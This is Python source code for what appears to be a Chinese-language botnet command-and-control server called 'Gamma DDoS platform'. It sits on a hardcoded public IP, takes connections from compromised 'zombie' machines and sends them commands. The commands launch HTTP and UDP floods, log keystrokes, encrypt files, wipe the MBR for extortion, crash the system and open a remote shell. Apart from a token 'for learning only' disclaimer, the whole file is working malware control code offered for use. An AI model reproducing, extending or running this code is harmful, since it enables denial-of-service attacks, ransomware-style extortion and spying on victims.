# 伽马DDoS平台2.0全新升级打爆服务器
import platform
import random
import base64
import os
import time
import subprocess
import re
import datetime
from colorama import init,Fore
from socket import *
from colorama import Fore,init
import threading,os,base64
init()
def logo():
    a = random.randint(1,3)
    list = "伽马攻击平台2.1升级"
    for i in list:
        print(i,end="")
        time.sleep(0.01)
    logo1 = """
                   _,.-------.,_
                ,;~'             '~;,
              ,;                     ;,
             ;                         ;
            ,'                         ',
           ,;                           ;,
           ; ;      .           .      ; ;
           | ;   ______       ______   ; |
           |  `/~"     ~" . "~     "~'  |                                                                                                                                                                                                  
           |  ~  ,-~~~^~, | ,~^~~~-,  ~  |                                                                                                                                                                                                 
            |   |        }:{        |   |                                                                                                                                                                                                  
            |   l       / | \       !   |                                                                                                                                                                                                  
             .~  (__,.--" .^. "--.,__)  ~.                                                                                                                                                                                                 
            |     ---;' / | \ `;---     |                                                                                                                                                                                                  
             \__.       \/^\/       .__/                                                                                                                                                                                                   
               V| \                 / |V                                                                                                                                                                                                   
               | |T~\___!___!___/~T| |                                                                                                                                                                                                     
               | |`IIII_I_I_I_IIII'| |                                                                                                                                                                                                     
               |  \,III I I I III,/  |                                                                                                                                                                                                     
                \   `~~~~~~~~~~'    /                                                                                                                                                                                                      
                  \   .       .   /                                                                                                                                                                                                        
                     \.    ^    ./                                                                                                                                                                                                         
                       ^~~~^~~~^  
    """
    logo2 = """
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##

    """
    logo3 = """
       .:okOOOkdc'           'cdkOOOko:.                                      
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                    
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                   
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                  
  oOOOOOOOO00000000000000000000000OOOOOOOOo                                  
  dOOOOOOOO00000.▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓.OOOOOOOOx                                  
  lOOOOOOOO00000.▓▓.0000000000000.OOOOOOOOl                                  
  .OOOOOOOO00000.▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓.OOOOOOOO.                                  
   cOOOOOOO00000.▓▓.00000000oOO00.0OOOOOOOc                                   
    oOOOOOO00000.▓▓.O000000OOOO00.0OOOOOOo                                    
     lOOOOO00000.▓▓.0000000000000.0OOOOOl                                     
      ;OOOO00000.▓▓.O00000OOOO000.0OOOO;                                      
       .dOOo00000..OocccxOOOO00000xOOd.                                       
         ,kOl00000OOOOOOOOOOO0000dOk,                                         
           :kk;000OOOOOOOOOOO.cOk:                                           
             ;kOOOOOOOOOOOOOOOk:                                             
               ,xOOOOOOOOOOOx,                                               
                 .lOOOOOOOl.                                                 
                    ,dOd,                                                    
                      .                  
    """
    logo6 = """作者QQ：2717914710
    版本： 2.1
    ############################################
    修复了已知的BUG，反馈bug请加QQ :) ps:因为软件的开发是有我一个人完成的后续可能会推出收费版功能更强大
    本软件不得用于非法事情或者盗卖，仅做学习交流
    ###########################################################################################
    """
    print(end='\n')
    if a == 1:
        print(Fore.GREEN+logo1)
        time.sleep(1)
    elif a == 2:
        print(logo2)
        time.sleep(2)
    elif a == 3:
        print(Fore.RED+logo3)
        time.sleep(1)
    print("\033[31m伽马攻击平台加载完成！！！\033[0m")
    time.sleep(1)
    print(logo6)
    time.sleep(1)
def screen():
    # -*- coding=utf-8 -*-
    import socket
    import time
    while True:
            count = 0
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            IPs = IP
            server_addr = ('' + IPs, 1080)
            s.bind(server_addr)
            print('等待对方的文件')
            received_size = 0
            while True:
                if count == 0:
                    data, client_addr = s.recvfrom(4096)
                    print('连接来自 %s:%s' % client_addr)
                    # Record the start time of the receiver running
                    start = time.time()
                    f = open(data, 'wb')
                data, client_addr = s.recvfrom(4096)
                if str(data) != "b'end'":
                    received_size += len(data)
                    f.write(data)
                    # Record the current system time
                    end = time.time()
                    # Print the current time every 1s
                    # while printing the cumulative amount of transmission
                    if end - start > 1:
                        print(end)
                        print('正在传输 ', received_size, ' 字节')
                        start = time.time()
                else:
                    break
                s.sendto('ok'.encode('utf-8'), client_addr)
                count += 1
                print('文件一共 ', received_size, ' 字节')
                break
def shells():
    import socket

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    serveraddr = (socket.gethostbyname(socket.gethostname()), 12345)
    server.bind(serveraddr)

    server.listen(10000)

    # 多客户端连接循环
    # 服务器使用新套接字通信
    while True:
        print("等待肉鸡连接.....")

        # 等待连接，成功显示客户端IP
        newsocket, clientaddr = server.accept()
        print("From{},".format(clientaddr), end="")

        # 客户端循环输入cmd命令
        while True:

            # 显示客户端返回的内容
            data = newsocket.recv(1024)
            print(data.decode())

            # 发送CMD
            cmd = input("Feng hacking 已进入目标shell请指示>>>")
            newsocket.send(cmd.encode())

            # 退出当前客户端的连接，break后等待新客户端的连接
            if cmd == "exit":
                # 关闭远程CMD
                exit_data = newsocket.recv(1024)
                print(exit_data.decode())
                break
def dowload():
        import socket
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind((IP,1080))
        s.listen(1)
        while True:
            conn,adder = s.accept()
            data = conn.recv(1024).decode('utf-8')
            print(data)
            oa = open('123.txt','a')
            oa.write(str(data))
            break
def main():
    address = IP
    port = 5000
    buffsize = 1024
    s = socket(AF_INET, SOCK_STREAM)
    s.bind((address, port))
    s.listen(50)  # 最大排队连接数
    datasock_list = []# 机器列
    clinet = ""
    clinets = []
    def single(c):
        single_clinet = c
        while True:
            single_attack = input("Feng Attack(单):")
            if single_attack == "/help":
                print('''
                    搜索IP在那个位置(在single用法中有用) /search=xxx.xxx.xxx.xxx
                    检查傀儡存活情况 /zombie
                    查看傀儡数量 /ls
                    列出傀儡信息 /ol
                    进入单个针对性模式 /single 搭配search给出的数字使用 ---> /single=1(针对1号傀儡机)
                    发起攻击指令 /ddos_http://....
                    键盘监听 /keyboard_eavesdropping
                    蓝屏 /blue
                    加密文件 /encryption=要加密的文件后缀（/encryption=.txt）
                    解密文件 /decrypt和加密文件一样的用法
                    关机  /shutdown
                    发消息 /msg
                    使用UDP执行DDOS /udp
                    下载文件 /dowload
                    上传文件（需要服务器）/upload ---> /upload=http://你VPS的IP或者kali开启apache2/目录下的文件（例如:/upload=http://192.168.1.1/text.txt）
                    截屏（还处于测试阶段不稳定） /screen
                    进入shell /shell
                ''')
            elif single_attack == "/shell":
                datasock_list[int(single_clinet)].send(bytes(single_attack.encode()))
                shells()
            elif single_attack == "/dowload":
                datasock_list[int(single_clinet)].send(bytes(single_attack.encode()))
                dowload()
            elif single_attack == "exit" or single_attack == "break":
                break
            datasock_list[int(single_clinet)].send(bytes(single_attack.encode()))
    # 保持连接
    def tcplink(sock, address):
        print("新增傀儡:"+str(address))
        a = re.findall(r'\d+.\d+.\d+.\d+',str(address))
        clinet = a
        clinets.append("".join(clinet))

    # 启动sock
    def run():
        while True:
            clientsock, clientaddress = s.accept()
            if clientsock not in datasock_list:
                datasock_list.append(clientsock)
            threading.Thread(target=tcplink, args=(clientsock, clientaddress)).start()
    # 发送指令
    def send(com):
        try:
            for i in datasock_list:
                        i.sendall(com.encode('utf-8'))
        except:
            datasock_list.remove(i)

    # 输入指令
    def post_cmd():
        while True:
            command = input('Feng Attack(群): >>> ')
            if command == '/ol':
                print(f'在线{len(datasock_list)}台')
            elif command == '/zombie':
                a = len(datasock_list)
                send("123")
                b = len(datasock_list)
                c = a - b
                print("当前一共有:"+str(b)+"台")
                print("和C2服务器丢失连接的有:" + str(c) + "台")
            elif command == '/ls':
                if len(datasock_list) < 1:
                    print('暂无机器在线')
                else:
                    for i in datasock_list:
                        print(i)
            elif command.split('=')[0] == "/search":
                try:
                    print(clinets.index(command.split("=")[1]))
                except:
                    print("当前还没有"+command.split("=")[1]+"的控制权")
            elif command.split('_')[0] == '/ddos':
                ok = input('确定向 ( ' + command.split('_')[1] + ' ) 发起进攻吗?(y,n) >>>')
                if ok == 'y':
                    send(command)
                else:
                    print('取消攻击')
            elif command == '/stop_ddos':
                    send(command)
            elif command.split('=')[0] == '/msg':
                send(command)
            elif command.split('=')[0] == '/shutdown':
                send(command)
            elif command.split('=')[0] == '/encryption':
                send(command)
            elif command.split('=')[0] == '/decrypt':
                send(command)
            elif command.split('=')[0] == '/blue':
                send(command)
            elif command.split('=')[0] == '/keyboard_eavesdropping':
                send(command)
            elif command.split('=')[0] == '/udp':
                attack = input(Fore.WHITE+"确定向("+Fore.RED+command.split("=")[1]+Fore.WHITE+")发起进攻吗？(y/n):")
                if attack == "y":
                    send(command)
                else:
                    pass
            elif command.split('=')[0] == '/stop_ddos':
                send(command)
            elif command.split('=')[0] == '/upload':
                send(command)
            elif command.split('=')[0] == '/shell':
                send(command)
                shells()
            elif command.split('=')[0] == '/screen':
                send(command)
                screen()
            elif command.split('=')[0] == '/dowload':
                send(command)
                dowload()
            elif command.split('=')[0] == '/stop_udp':
                send(command)
            elif command.split('=')[0] == '/mbrrecover':
                send(command)
            elif command.split('=')[0] == '/mbrkill':
                send(command)

            elif command.split('=')[0] == '/single':
                try:
                    single(command.split('=')[1])
                except:
                    print("请输入正确的用法")
            elif command.split('=')[0] == '/help':
                print('''
                    搜索IP在那个位置(在single用法中有用) /search=xxx.xxx.xxx.xxx
                    检查傀儡存活情况 /zombie
                    查看傀儡数量 /ls
                    列出傀儡信息 /ol
                    擦出傀儡机MBR(开不了机,可以进行勒索) /mbrkill
                    恢复MBR /mbrrecover
                    进入单个针对性模式 /single 搭配search给出的数字使用 ---> /single=1(针对1号傀儡机)
                    发起攻击指令 /ddos_http://....
                    键盘监听 /keyboard_eavesdropping
                    蓝屏 /blue
                    加密文件 /encryption=要加密的文件后缀（/encryption=.txt）
                    解密文件 /decrypt和加密文件一样的用法
                    关机  /shutdown
                    发消息 /msg
                    使用UDP执行DDOS /udp ---> /udp=xxx.xxx.xxx.xxx=80(这是端口)=500000(这个是发包数量)
                    下载文件 /dowload
                    上传文件（需要服务器）/upload ---> /upload=http://你VPS的IP或者kali开启apache2/目录下的文件（例如:/upload=http://192.168.1.1/text.txt）
                    截屏（还处于测试阶段不稳定） /screen
                    进入shell /shell
                ''')
            else:
                print('未知指令 您可以输入/help接受指引')
    threading.Thread(target=run, args=()).start()
    threading.Thread(target=post_cmd, args=()).start()
def getsystem():
    print('您使用的操作系统:'+platform.system()+platform.architecture()+"位")
def user():
    if os.path.exists("./userd.txt") == True:
        pass
    else:
        users = input("请输入名称以后方便称呼:")
        with open("userd.txt",'w') as f:
            f.write(users)
def wel():
    now_time = datetime.datetime.now()
    print("现在是"+str(now_time))
    time.sleep(0.5)
    a = open("userd.txt",'rb').read()
    b = str(a,encoding='gbk')
    print("\033[35m欢迎回家！\033[0m"+b)

if __name__ == '__main__':
    logo()
    user()
    wel()
    IP='38.54.85.58'
    main()